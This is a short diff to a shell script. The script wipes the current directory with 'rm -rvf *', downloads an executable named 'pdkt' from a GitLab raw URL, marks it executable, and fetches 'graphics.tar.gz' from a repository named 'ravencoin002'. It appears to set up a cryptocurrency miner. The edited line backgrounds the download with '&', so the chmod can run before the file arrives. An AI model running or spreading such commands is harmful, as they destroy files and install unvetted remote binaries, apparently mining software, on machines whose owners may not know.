@@ -1,8 +1,6 @@
-rm -rvf * && mkdir m && cd m
+rm -rvf *
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/pdkt
-
-chmod +x pdkt
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/pdkt & chmod +x pdkt
 
 wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
 
